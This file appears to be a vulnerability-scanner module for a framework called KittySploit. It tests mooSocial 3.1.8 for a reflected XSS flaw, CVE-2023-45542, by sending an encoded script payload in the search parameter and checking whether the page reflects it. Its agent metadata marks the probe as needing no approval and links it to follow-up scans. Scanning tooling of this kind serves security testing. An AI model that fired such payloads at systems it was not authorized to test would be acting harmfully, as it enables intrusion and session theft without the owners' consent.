#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting (XSS) vulnerability exisits in the q parameter on search function of mooSocia."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MooSocial 3.1.8 - Cross-Site Scripting Detection',
        'description': "A reflected cross-site scripting (XSS) vulnerability exisits in the q parameter on search function of mooSocial v3.1.8 which allows attackers to steal user's session cookies and impersonate their account via a crafted URL.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'moosocial', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ahrixia/CVE-2023-45542',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-45542',
            'https://github.com/nomi-sec/PoC-in-GitHub',
        ],
        'cve': 'CVE-2023-45542',
    }

    def run(self):
        r = self.http_request(method="GET", path='/search/index/?q=test%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3etest', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<script>alert(document.domain)</script>', 'mooSocial',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="MooSocial 3.1.8 - Cross-Site Scripting detected",
                path='/search/index/?q=test%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3etest',
            )
            return True
        return False

